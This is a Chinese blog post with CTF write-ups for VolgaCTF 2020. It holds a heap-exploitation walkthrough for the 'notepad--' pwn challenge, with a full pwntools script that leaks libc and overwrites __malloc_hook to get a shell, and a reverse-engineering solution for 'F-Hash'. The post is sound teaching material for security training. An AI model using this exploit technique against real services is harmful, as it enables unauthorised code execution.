<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>VolgaCTF 2020 | Nop</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Nop" type="application/atom+xml">
</head><link rel="stylesheet" type="text/css" href="/css/customize.css"><link rel="stylesheet" type="text/css" href="/plugins/prettify/doxy.css"><script type="text/javascript" src="/js/ready.js" async></script><body><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">Nop</a></h1></div><p class="m-desc">There is a long way to go</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">Archives</a></li><li><span class="dot">●</span><a href="/categories/">Categories</a></li><li><span class="dot">●</span><a href="/tags/">Tags</a></li><li><span class="dot">●</span><a href="/about/">About</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="Search" onfocus="if(this.value=='Search'){this.value='';}" onblur="if(this.value==''){this.value='Search';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">VolgaCTF 2020</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2020/03/31/VolgaCTF-2020/">2020-03-31</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/Writeup/">Writeup</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>做了两题溜了，pwn倒是挺简单，被f-hash搞得心态崩了，主要是搞出来的flag错了，找不到问题。结果看人家的wp，wtf，脚本是对的，flag就一个字母不对？？？</p>
<blockquote>
<p>notepad--: 300pts</p>
</blockquote>
<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>保护全开</p>
<pre><code>Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled</code></pre><p>两类操作，一个是对notebook操作：</p>
<pre><code>[p]ick    notebook
[a]dd     notebook
[d]elete  notebook
[l]ist    notebook
[q]uit</code></pre><p>一个是在<code>pick notebook</code>之后，对notebook的tabs进行操作：</p>
<pre><code>[a]dd     tab
[v]iew    tab
[u]pdate  tab
[d]elete  tab
[l]ist    tabs
[q]uit</code></pre><p>notebook最多16个，每个notebook的空间2072bytes，分配在bss上，包含16bytes的name，8bytes的tabs个数，64个tabs的空间，每个tab占32bytes：</p>
<pre><code>(.bss)
notebook_1 ===================&gt; +--------+--------+ 
             notebook_1.name &lt;--|--      |      --|--&gt; notebook_1.name
                                +--------+--------+
        notebook_1.tab_count &lt;--|--      |      --|--&gt; tab_1.name
                                +--------+--------+
                  tab_1.name &lt;--|--      |      --|--&gt; tab_1.content_size
                                +--------+--------+
          tab_1.content_addr &lt;--|--      |      --|--&gt; tab_2.name
                                +--------+--------+
                  tab_2.name &lt;--|--      |      --|--&gt; tab_2.content_size
                                +--------+--------+
          tab_2.content_addr &lt;--|--      |      --|--&gt; tab_3.name
                                +--------+--------+
                                ...................
                                +--------+--------+
         tab_63.content_addr &lt;--|--      |      --|--&gt; tab_64.name
                                +--------+--------+
                 tab_64.name &lt;--|--      |      --|--&gt; tab_64.content_size
                                +--------+--------+ &lt;=================== notebook_2
         tab_64.content_addr &lt;--|--      |      --|--&gt; notebook_2.name
                                +--------+--------+
             notebook_2.name &lt;--|--      |      --|--&gt; notebook_2.tab_count
                                +--------+--------+
                  tab_1.name &lt;--|--      |      --|--&gt; tab_1.name
                                +--------+--------+
          tab_1.content_size &lt;--|--      |      --|--&gt; tab_1.content_addr
                                +--------+--------+
                  tab_2.name &lt;--|--      |      --|--&gt; tab_2.name
                                +--------+--------+
          tab_2.content_size &lt;--|--      |      --|--&gt; tab_2.content_addr
                                +--------+--------+
                                ...................</code></pre><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><h4 id="leak-heap-address"><a href="#leak-heap-address" class="headerlink" title="leak heap address"></a>leak heap address</h4><p><code>add notebook</code>中，输入notebook name的时候没有限制长度：</p>
<pre><code class="C">// add notebook
int sub_1442()
{
    __int64 v1; // rax
    char *v2; // [rsp+8h] [rbp-8h]

    if ( notebook_count == 16 )
        return puts(&quot;You&#39;ve reached the limit for notebooks! Delete some of the older once first!&quot;);
    v1 = notebook_count++;
    v2 = (char *)&amp;notebooks + 2072 * v1;
    printf(&quot;Enter notebook name: &quot;);
    return __isoc99_scanf(&quot;%s&quot;, v2); // no limit, overflow
}</code></pre>
<p>因此可以覆盖<code>notebook.tab_count</code>，而且程序在<code>add tab</code>的操作中限制tabs个数的逻辑为：</p>
<pre><code class="C">if ( *(_QWORD *)(a1 + 16) == 64LL )
{
  puts(&quot;You&#39;ve reached the limit of tabs! Delete some of the older tabs to add a new one!&quot;);
}</code></pre>
<p>所以只要覆盖<code>notebook_1.tab_count</code>为65，就可以往下一个notebook写data，而对应的，就能将notebook_2中的<code>tab_2.name</code>覆盖为<code>malloc</code>申请的<code>table_66.content_addr</code>，也就是堆地址。<br><br>那么只要事先添加notebook_2，并同样地覆盖<code>notebook_2.tab_count</code>为2，再进行<code>list tabs</code>操作，就可以从<code>tab_2.name</code>中获得heap address。</p>
<h4 id="leak-libc-address"><a href="#leak-libc-address" class="headerlink" title="leak libc address"></a>leak libc address</h4><p>事先free出一个unsorted bin，因为heap address已经leak出来了，故unsorted bin的地址可以计算得到。<br><br>同样利用notebook name的溢出，覆盖下一个notebook的tab域，伪造出相应的content_addr(unsorted bin address)，然后利用操作<code>view tab</code>来leak出main_arena的地址，这样就完成了leak libc address<br><br>（测试的时候，因为本地是ubuntu 18.04，正好远程和本地的libc版本一致。）</p>
<h4 id="write-malloc-hook"><a href="#write-malloc-hook" class="headerlink" title="write __malloc_hook"></a>write __malloc_hook</h4><p>同样伪造下一个notebook的tab域中的content_size和content_addr(__malloc_hook address)，然后利用操作<code>update tab</code>写入one_gadget就行了。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
import sys

pwn_remote = 1

if pwn_remote:
    p = remote(&quot;notepad.q.2020.volgactf.ru&quot;, 45678)
else:
    p = process(&quot;./notepad&quot;)
    if len(sys.argv) == 2 and sys.argv[1] == &quot;1&quot;:
        gdb.attach(p)

def add_note(name):
    p.sendlineafter(&quot;&gt; &quot;, &quot;a&quot;)
    p.sendlineafter(&quot;Enter notebook name: &quot;, name)

def pick_note(index):
    p.sendlineafter(&quot;&gt; &quot;, &quot;p&quot;)
    p.sendlineafter(&quot;Enter index of a notebook to pick: &quot;, str(index))

def add_tab(name, length, data):
    p.sendlineafter(&quot;&gt; &quot;, &quot;a&quot;)
    p.sendlineafter(&quot;Enter tab name: &quot;, name)
    p.sendlineafter(&quot;Enter data length (in bytes): &quot;, str(length))
    p.sendafter(&quot;Enter the data: &quot;, data)

def del_tab(index):
    p.sendlineafter(&quot;&gt; &quot;, &quot;d&quot;)
    p.sendlineafter(&quot;Enter index of tab to delete: &quot;, str(index))

def list_tab(index):
    p.sendlineafter(&quot;&gt; &quot;, &quot;l&quot;)
    p.recvuntil(&quot;[&quot; + str(index) + &quot;] &quot;)
    return p.recv(6)

def update_tab(index, name, length, data):
    p.sendlineafter(&quot;&gt; &quot;, &quot;u&quot;)
    p.sendlineafter(&quot;Enter index of tab to update: &quot;, str(index))
    p.sendlineafter(&quot;Enter new tab name (leave empty to skip): &quot;, str(name))
    p.sendlineafter(&quot;Enter new data length (leave empty to keep the same): &quot;, str(length))
    p.sendafter(&quot;Enter the data: &quot;, data)

def view_tab(index):
    p.sendlineafter(&quot;&gt; &quot;, &quot;v&quot;)
    p.sendlineafter(&quot;Enter index of a tab to view: &quot;, str(index))
    return p.recv(8)

def quit_from_tabs():
    p.sendlineafter(&quot;&gt; &quot;, &quot;q&quot;)

context.log_level = &quot;debug&quot;

main_arena_offset = 0x3ebca0
realloc_offset = 0x40c7e0
malloc_hook_offset = 0x3ebc30
one_gadget_offset = 0x10a38c


# operate note 1
add_note(&quot;AAAA&quot;)
pick_note(1)
add_tab(&quot;BBBB&quot;, 0x500, &quot;BBBB&quot;)
add_tab(&quot;CCCC&quot;, 0x30, &quot;CCCC&quot;)
del_tab(1)
quit_from_tabs()

# operate note 2
add_note(&quot;D&quot; * 0x10 + p64(65))
pick_note(2)
add_tab(&quot;DDDD&quot;, 0x20, &quot;DDDD&quot;)
quit_from_tabs()

# operate note 3
add_note(&quot;E&quot; * 0x10 + p64(2))
pick_note(3)
heap_addr = u64(list_tab(2).ljust(8, &quot;\x00&quot;))
unsorted_bin_addr = heap_addr + 0x30
quit_from_tabs()

# operate note 4
add_note(&quot;F&quot; * 0x10 + p64(1) + &quot;F&quot; * 0x10 + p64(8) + p64(unsorted_bin_addr))
pick_note(4)
main_arena = u64(view_tab(1))
libc_base = main_arena - main_arena_offset
quit_from_tabs()

# operate note 5
one_gadget = libc_base + one_gadget_offset
malloc_hook = libc_base + malloc_hook_offset
add_note(&quot;G&quot; * 0x10 + p64(1) + &quot;G&quot; * 0x10 + p64(0x10) + p64(malloc_hook))
pick_note(5)
update_tab(1, &quot;G&quot; * 0x10, 0x10, p64(one_gadget))

# trigger malloc_hook
p.sendlineafter(&quot;&gt; &quot;, &quot;a&quot;)
p.sendlineafter(&quot;Enter tab name: &quot;, &quot;shell&quot;)
p.sendlineafter(&quot;Enter data length (in bytes): &quot;, str(0x10))

success(&quot;heap_addr: &quot; + hex(heap_addr))
success(&quot;unsorted_bin_addr: &quot; + hex(unsorted_bin_addr))
success(&quot;main_arena: &quot; + hex(main_arena))
success(&quot;libc_base: &quot; + hex(libc_base))
success(&quot;one_gadget: &quot; + hex(one_gadget))

p.interactive()</code></pre>
<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p><code>VolgaCTF{i5_g1ibc_mall0c_irr3p@rable?}</code></p>
<blockquote>
<p>F-Hash: 250pts</p>
</blockquote>
<h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>普通ELF文件，直接跑没有回显，程序里存在递归函数，深度是0x100，直接跑是跑不出结果的，不过跑完就能出flag。</p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>IDA动态调试，直接run起来，然后暂停，找到递归函数的位置。</p>
<pre><code class="C">_int64 *__fastcall sub_55EE370633B0(__int64 *a1, int a2, __int64 a3, __int64 a4)
{
    __int64 v4; // r14
    __int64 v5; // r12
    __int64 v6; // rax
    __int64 v7; // rdx
    __int64 v9; // rax
    __int64 v10; // rdx
    __int64 v11; // r13
    __int128 v12; // ax
    __int128 v13; // ax
    __int128 v14; // cx
    __int128 v15; // [rsp+0h] [rbp-78h]
    __int64 v16; // [rsp+10h] [rbp-68h]
    __int128 v17; // [rsp+20h] [rbp-58h]
    __int64 v18; // [rsp+30h] [rbp-48h]
    unsigned __int64 v19; // [rsp+48h] [rbp-30h]

    v4 = a4;
    v5 = a3;
    v19 = __readfsqword(0x28u);
    if ( a2 == 1 )
    {
        v9 = calc(a3, a4);
        a1[2] = 0LL;
        *a1 = v9;
        a1[1] = v10;
    }
    else if ( a2 == 2 )
    {
        v6 = calc(a3 ^ 1, a4);
        a1[2] = 1LL;
        *a1 = v6;
        a1[1] = v7;
    }
    else
    {
        recursive_func((__int64 *)&amp;v15, a2 - 1, a3, a4);
        recursive_func((__int64 *)&amp;v17, a2 - 2, v5, v4);
        v11 = v16 + v18;
        *(_QWORD *)&amp;v12 = calc((v16 + v18) ^ v5, v4);
        v13 = v15 + v17 + v12;
        v14 = *(_OWORD *)(table + 16LL * a2);
        if ( *((_QWORD *)&amp;v14 + 1) &lt;= *((_QWORD *)&amp;v13 + 1) )
        {
        if ( *((_QWORD *)&amp;v14 + 1) &gt;= *((_QWORD *)&amp;v13 + 1) )
            goto LABEL_11;
        do
        {
            do
            v13 -= v14;
            while ( *((_QWORD *)&amp;v14 + 1) &lt; *((_QWORD *)&amp;v13 + 1) );
            if ( *((_QWORD *)&amp;v14 + 1) &gt; *((_QWORD *)&amp;v13 + 1) )
            break;
    LABEL_11:
            ;
        }
        while ( (unsigned __int64)v14 &lt; (unsigned __int64)v13 );
        }
        *(_OWORD *)a1 = v13;
        a1[2] = v11;
    }
    return a1;
    }</code></pre>
<p>其最外层调用是：</p>
<pre><code class="C">do
{
    v32 = v20[1];
    v57.m128i_i64[0] = *v20;
    v57.m128i_i64[1] = v32;
    recursive_func(v30, v29, v57.m128i_i64[0], v32);
    v20 += 2;
    v27 ^= v72.m128i_i64[0] + v57.m128i_i64[0];
    v28 ^= (*(_OWORD *)&amp;v72 + *(_OWORD *)&amp;v57) &gt;&gt; 64;
}
while ( v20 != v31 );</code></pre>
<p>改写这个<code>recursive_func</code>：</p>
<pre><code class="python">from pwn import *

strings = &quot;The quick brown fox jumps over the lazy dog&quot; + &quot;\x80&quot; + &quot;\x00&quot; * 0xC + &quot;\x2b&quot; + &quot;\x00&quot; * 0x7 

table = [
    0x0,
    0xF6000000000000000000000000000001,
    0xF6000000000000000000000000000001,
    0xF6000000000000000000000000000001,
    0xF6000000000000000000000000000001,
    0xF6000000000000000000000000000001,
    0xF6000000000000000000000000000001,
    0xF6000000000000000000000000000001,
    0xF6000000000000000000000000000001,
    0xF6000000000000000000000000000001,
    0xF6000000000000000000000000000001,
    0xF600000000000000000000000000000B,
    0xF600000000000000000000000000000B,
    0xF600000000000000000000000000000B,
    0xF600000000000000000000000000000B,
    0xF600000000000000000000000000000B,
    0xF600000000000000000000000000000B,
    0xF600000000000000000000000000000B,
    0xF600000000000000000000000000000B,
    0xF600000000000000000000000000000B,
    0xF600000000000000000000000000000B,
    0xF6000000000000000000000000000015,
    0xF6000000000000000000000000000015,
    0xF6000000000000000000000000000015,
    0xF6000000000000000000000000000015,
    0xF6000000000000000000000000000015,
    0xF6000000000000000000000000000015,
    0xF6000000000000000000000000000015,
    0xF6000000000000000000000000000015,
    0xF6000000000000000000000000000015,
    0xF6000000000000000000000000000015,
    0xF600000000000000000000000000001F,
    0xF600000000000000000000000000001F,
    0xF600000000000000000000000000001F,
    0xF600000000000000000000000000001F,
    0xF600000000000000000000000000001F,
    0xF600000000000000000000000000001F,
    0xF600000000000000000000000000001F,
    0xF600000000000000000000000000001F,
    0xF600000000000000000000000000001F,
    0xF600000000000000000000000000001F,
    0xF6000000000000000000000000000029,
    0xF6000000000000000000000000000029,
    0xF6000000000000000000000000000029,
    0xF6000000000000000000000000000029,
    0xF6000000000000000000000000000029,
    0xF6000000000000000000000000000029,
    0xF6000000000000000000000000000029,
    0xF6000000000000000000000000000029,
    0xF6000000000000000000000000000029,
    0xF6000000000000000000000000000029,
    0xF6000000000000000000000000000033,
    0xF6000000000000000000000000000033,
    0xF6000000000000000000000000000033,
    0xF6000000000000000000000000000033,
    0xF6000000000000000000000000000033,
    0xF6000000000000000000000000000033,
    0xF6000000000000000000000000000033,
    0xF6000000000000000000000000000033,
    0xF6000000000000000000000000000033,
    0xF6000000000000000000000000000033,
    0xF600000000000000000000000000003D,
    0xF600000000000000000000000000003D,
    0xF600000000000000000000000000003D,
    0xF600000000000000000000000000003D,
    0xF600000000000000000000000000003D,
    0xF600000000000000000000000000003D,
    0xF600000000000000000000000000003D,
    0xF600000000000000000000000000003D,
    0xF600000000000000000000000000003D,
    0xF600000000000000000000000000003D,
    0xF6000000000000000000000000000047,
    0xF6000000000000000000000000000047,
    0xF6000000000000000000000000000047,
    0xF6000000000000000000000000000047,
    0xF6000000000000000000000000000047,
    0xF6000000000000000000000000000047,
    0xF6000000000000000000000000000047,
    0xF6000000000000000000000000000047,
    0xF6000000000000000000000000000047,
    0xF6000000000000000000000000000047,
    0xF6000000000000000000000000000051,
    0xF6000000000000000000000000000051,
    0xF6000000000000000000000000000051,
    0xF6000000000000000000000000000051,
    0xF6000000000000000000000000000051,
    0xF6000000000000000000000000000051,
    0xF6000000000000000000000000000051,
    0xF6000000000000000000000000000051,
    0xF6000000000000000000000000000051,
    0xF6000000000000000000000000000051,
    0xF600000000000000000000000000005B,
    0xF600000000000000000000000000005B,
    0xF600000000000000000000000000005B,
    0xF600000000000000000000000000005B,
    0xF600000000000000000000000000005B,
    0xF600000000000000000000000000005B,
    0xF600000000000000000000000000005B,
    0xF600000000000000000000000000005B,
    0xF600000000000000000000000000005B,
    0xF600000000000000000000000000005B,
    0xF6000000000000000000000000000065,
    0xF6000000000000000000000000000065,
    0xF6000000000000000000000000000065,
    0xF6000000000000000000000000000065,
    0xF6000000000000000000000000000065,
    0xF6000000000000000000000000000065,
    0xF6000000000000000000000000000065,
    0xF6000000000000000000000000000065,
    0xF6000000000000000000000000000065,
    0xF6000000000000000000000000000065,
    0xF600000000000000000000000000006F,
    0xF600000000000000000000000000006F,
    0xF600000000000000000000000000006F,
    0xF600000000000000000000000000006F,
    0xF600000000000000000000000000006F,
    0xF600000000000000000000000000006F,
    0xF600000000000000000000000000006F,
    0xF600000000000000000000000000006F,
    0xF600000000000000000000000000006F,
    0xF600000000000000000000000000006F,
    0xF6000000000000000000000000000079,
    0xF6000000000000000000000000000079,
    0xF6000000000000000000000000000079,
    0xF6000000000000000000000000000079,
    0xF6000000000000000000000000000079,
    0xF6000000000000000000000000000079,
    0xF6000000000000000000000000000079,
    0xF6000000000000000000000000000079,
    0xF6000000000000000000000000000079,
    0xF6000000000000000000000000000079,
    0xF6000000000000000000000000000083,
    0xF6000000000000000000000000000083,
    0xF6000000000000000000000000000083,
    0xF6000000000000000000000000000083,
    0xF6000000000000000000000000000083,
    0xF6000000000000000000000000000083,
    0xF6000000000000000000000000000083,
    0xF6000000000000000000000000000083,
    0xF6000000000000000000000000000083,
    0xF6000000000000000000000000000083,
    0xF600000000000000000000000000008D,
    0xF600000000000000000000000000008D,
    0xF600000000000000000000000000008D,
    0xF600000000000000000000000000008D,
    0xF600000000000000000000000000008D,
    0xF600000000000000000000000000008D,
    0xF600000000000000000000000000008D,
    0xF600000000000000000000000000008D,
    0xF600000000000000000000000000008D,
    0xF600000000000000000000000000008D,
    0xF6000000000000000000000000000097,
    0xF6000000000000000000000000000097,
    0xF6000000000000000000000000000097,
    0xF6000000000000000000000000000097,
    0xF6000000000000000000000000000097,
    0xF6000000000000000000000000000097,
    0xF6000000000000000000000000000097,
    0xF6000000000000000000000000000097,
    0xF6000000000000000000000000000097,
    0xF6000000000000000000000000000097,
    0xF60000000000000000000000000000A1,
    0xF60000000000000000000000000000A1,
    0xF60000000000000000000000000000A1,
    0xF60000000000000000000000000000A1,
    0xF60000000000000000000000000000A1,
    0xF60000000000000000000000000000A1,
    0xF60000000000000000000000000000A1,
    0xF60000000000000000000000000000A1,
    0xF60000000000000000000000000000A1,
    0xF60000000000000000000000000000A1,
    0xF60000000000000000000000000000AB,
    0xF60000000000000000000000000000AB,
    0xF60000000000000000000000000000AB,
    0xF60000000000000000000000000000AB,
    0xF60000000000000000000000000000AB,
    0xF60000000000000000000000000000AB,
    0xF60000000000000000000000000000AB,
    0xF60000000000000000000000000000AB,
    0xF60000000000000000000000000000AB,
    0xF60000000000000000000000000000AB,
    0xF60000000000000000000000000000B5,
    0xF60000000000000000000000000000B5,
    0xF60000000000000000000000000000B5,
    0xF60000000000000000000000000000B5,
    0xF60000000000000000000000000000B5,
    0xF60000000000000000000000000000B5,
    0xF60000000000000000000000000000B5,
    0xF60000000000000000000000000000B5,
    0xF60000000000000000000000000000B5,
    0xF60000000000000000000000000000B5,
    0xF60000000000000000000000000000BF,
    0xF60000000000000000000000000000BF,
    0xF60000000000000000000000000000BF,
    0xF60000000000000000000000000000BF,
    0xF60000000000000000000000000000BF,
    0xF60000000000000000000000000000BF,
    0xF60000000000000000000000000000BF,
    0xF60000000000000000000000000000BF,
    0xF60000000000000000000000000000BF,
    0xF60000000000000000000000000000BF,
    0xF60000000000000000000000000000C9,
    0xF60000000000000000000000000000C9,
    0xF60000000000000000000000000000C9,
    0xF60000000000000000000000000000C9,
    0xF60000000000000000000000000000C9,
    0xF60000000000000000000000000000C9,
    0xF60000000000000000000000000000C9,
    0xF60000000000000000000000000000C9,
    0xF60000000000000000000000000000C9,
    0xF60000000000000000000000000000C9,
    0xF60000000000000000000000000000D3,
    0xF60000000000000000000000000000D3,
    0xF60000000000000000000000000000D3,
    0xF60000000000000000000000000000D3,
    0xF60000000000000000000000000000D3,
    0xF60000000000000000000000000000D3,
    0xF60000000000000000000000000000D3,
    0xF60000000000000000000000000000D3,
    0xF60000000000000000000000000000D3,
    0xF60000000000000000000000000000D3,
    0xF60000000000000000000000000000DD,
    0xF60000000000000000000000000000DD,
    0xF60000000000000000000000000000DD,
    0xF60000000000000000000000000000DD,
    0xF60000000000000000000000000000DD,
    0xF60000000000000000000000000000DD,
    0xF60000000000000000000000000000DD,
    0xF60000000000000000000000000000DD,
    0xF60000000000000000000000000000DD,
    0xF60000000000000000000000000000DD,
    0xF60000000000000000000000000000E7,
    0xF60000000000000000000000000000E7,
    0xF60000000000000000000000000000E7,
    0xF60000000000000000000000000000E7,
    0xF60000000000000000000000000000E7,
    0xF60000000000000000000000000000E7,
    0xF60000000000000000000000000000E7,
    0xF60000000000000000000000000000E7,
    0xF60000000000000000000000000000E7,
    0xF60000000000000000000000000000E7,
    0xF60000000000000000000000000000F1,
    0xF60000000000000000000000000000F1,
    0xF60000000000000000000000000000F1,
    0xF60000000000000000000000000000F1,
    0xF60000000000000000000000000000F1,
    0xF60000000000000000000000000000F1,
    0xF60000000000000000000000000000F1,
    0xF60000000000000000000000000000F1,
    0xF60000000000000000000000000000F1,
    0xF60000000000000000000000000000F1,
    0xF60000000000000000000000000000FB,
    0xF60000000000000000000000000000FB,
    0xF60000000000000000000000000000FB,
    0xF60000000000000000000000000000FB,
    0xF60000000000000000000000000000FB,
    0xF60000000000000000000000000000FB
]

def calc(low_bytes, high_bytes):
    a1 = low_bytes
    a2 = high_bytes
    v2 = (((((a2 &amp; 0x5555555555555555) + ((a2 &gt;&gt; 1) &amp; 0x5555555555555555)) &amp; 0x3333333333333333) \
         + ((((a2 &amp; 0x5555555555555555) + ((a2 &gt;&gt; 1) &amp; 0x5555555555555555)) &gt;&gt; 2) &amp; 0x3333333333333333)) &amp; 0xF0F0F0F0F0F0F0F) \
         + ((((((a2 &amp; 0x5555555555555555) + ((a2 &gt;&gt; 1) &amp; 0x5555555555555555)) &amp; 0x3333333333333333) \
         + ((((a2 &amp; 0x5555555555555555) + ((a2 &gt;&gt; 1) &amp; 0x5555555555555555)) &gt;&gt; 2) &amp; 0x3333333333333333)) &gt;&gt; 4) &amp; 0xF0F0F0F0F0F0F0F)
    v2 = v2 &amp; 0xFFFFFFFFFFFFFFFF
    v3 = ((((v2 &amp; 0xFF00FF00FF00FF) + ((v2 &gt;&gt; 8) &amp; 0xFF00FF00FF00FF)) &gt;&gt; 16) &amp; 0xFFFF0000FFFF) \
         + (((v2 &amp; 0xFF00FF00FF00FF) + ((v2 &gt;&gt; 8) &amp; 0xFF00FF00FF00FF)) &amp; 0xFFFF0000FFFF)
    v3 = v3 &amp; 0xFFFFFFFFFFFFFFFF
    v4 = (((a1 &amp; 0x5555555555555555) + ((a1 &gt;&gt; 1) &amp; 0x5555555555555555)) &amp; 0x3333333333333333) \
         + ((((a1 &amp; 0x5555555555555555) + ((a1 &gt;&gt; 1) &amp; 0x5555555555555555)) &gt;&gt; 2) &amp; 0x3333333333333333)
    v4 = v4 &amp; 0xFFFFFFFFFFFFFFFF
    v5 = (v4 &amp; 0xF0F0F0F0F0F0F0F) + ((v4 &gt;&gt; 4) &amp; 0xF0F0F0F0F0F0F0F)
    v5 = v5 &amp; 0xFFFFFFFFFFFFFFFF

    return (v3 &amp; 0xFFFFFFFF) \
           + (((v5 &amp; 0xFF00FF) + ((v5 &gt;&gt; 8) &amp; 0xFF00FF)) &amp; 0xFFFF) \
           + (((v5 &amp; 0xFF00FF) + ((v5 &gt;&gt; 8) &amp; 0xFF00FF)) &gt;&gt; 16) \
           + (((((v5 &amp; 0xFF00FF00FF00FF) + ((v5 &gt;&gt; 8) &amp; 0xFF00FF00FF00FF)) &amp; 0xFFFF0000FFFF) \
           + ((((v5 &amp; 0xFF00FF00FF00FF) + ((v5 &gt;&gt; 8) &amp; 0xFF00FF00FF00FF)) &gt;&gt; 16) &amp; 0xFFFF0000FFFF)) &gt;&gt; 32) \
           + (v3 &gt;&gt; 32)

def process(depth, high_bytes, low_bytes):
    res = [0 for i in range(depth + 1)]
    count = [0 for i in range(depth + 1)]
    for i in range(1, depth + 1):
        if i == 1:
            res[i] = calc(high_bytes, low_bytes)
            count[i] = 0
        elif i == 2:
            res[i] = calc(high_bytes ^ 1, low_bytes)
            count[i] = 1
        else:
            val_1 = res[i - 1]
            val_2 = res[i - 2]
            count[i] = (count[i - 1] + count[i - 2]) &amp; 0xFFFFFFFFFFFFFFFF
            tmp = calc(high_bytes ^ (count[i]), low_bytes)
            tmp += val_1 + val_2
            tmp &amp;= 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
            while tmp &gt; table[i]:
                tmp = tmp - table[i]
            res[i] = tmp
    print(&quot;set {long long}($rsp + 0xb0)= &quot; + hex(count[depth]))
    # for item in res:
    #     print(hex(item))
    return res[depth]


v27 = 0x9C8A210019B32312
v28 = 0x342D41A3B6410FF
for i in range(0, len(strings), 0x10):
    print(&quot;loop &quot; + str(i // 0x10 + 1) + &quot;:&quot;)

    value = process(0x100, u64(strings[i:i+8]), u64(strings[i+8:i+0x10]))
    high = value &gt;&gt; 64
    low = value &amp; 0xFFFFFFFFFFFFFFFF
    print(&quot;set {long long}($rsp + 0xa0) = &quot; + hex(low))
    print(&quot;set {long long}($rsp + 0xa8) = &quot; + hex(high))
    print

    # print(hex(u64(strings[i:i+8])), hex(u64(strings[i+8:i+0x10])))

    v27 ^= low + u64(strings[i:i+8])
    v28 ^= high + u64(strings[i+8:i+0x10])
    # print(hex(v27), hex(v28))</code></pre>
<p>跑出来的结果是：</p>
<pre><code>loop 1:
set {long long}($rsp + 0xb0)= 0x1bed585606b77ee2
set {long long}($rsp + 0xa0) = 0x9f7063cbae808c39
set {long long}($rsp + 0xa8) = 0x31c27b4975c414f8

loop 2:
set {long long}($rsp + 0xb0)= 0x1bed585606b77ee2
set {long long}($rsp + 0xa0) = 0xae737c67349d7930
set {long long}($rsp + 0xa8) = 0xa0c447a7cd22de

loop 3:
set {long long}($rsp + 0xb0)= 0x1bed585606b77ee2
set {long long}($rsp + 0xa0) = 0xb4ab72b2a625573c
set {long long}($rsp + 0xa8) = 0xf1b74bd139691b09

loop 4:
set {long long}($rsp + 0xb0)= 0x1bed585606b77ee2
set {long long}($rsp + 0xa0) = 0x9d78f243a21282bb
set {long long}($rsp + 0xa8) = 0x6db7dea733d71b4d</code></pre><p>当时我以为把这个<code>recursive_func</code>直接patch掉，然后算出原C里面的v27和v28两个值（这里没输出，注释掉了），在动态调试的时候直接set就可以出flag了，结果这样做没对，搞得我一直以为是脚本写错了，但是反复检查都没错，心累。<br><br>最后看着差了一个字母的flag，我开始断在<code>PIE+0x1781</code>的为值一步一步地手动set值，才得到正确的flag。</p>
<p><img src="/2020/03/31/VolgaCTF-2020/gdb.png" alt="gdb"></p>
<h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p><code>VolgaCTF{16011432ba16efc8dcf779477985b3b9}</code></p>
</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">Nop</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2020/03/31/VolgaCTF-2020/">http://n0nop.com/2020/03/31/VolgaCTF-2020/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="http://n0nop.com">Nop的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tags"></i><a href="/tags/CTF/">CTF</a><a href="/tags/pwn/">pwn</a><a href="/tags/re/">re</a></span></div></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/2020/04/05/Midnightsun-CTF-2020/">&lt; Midnightsun CTF 2020</a><a class="next" href="/2020/03/18/CONFidence-CTF-re-Locked-PE/">CONFidence CTF re: Locked PE &gt;</a></div></section><footer><p>Copyright © 2016 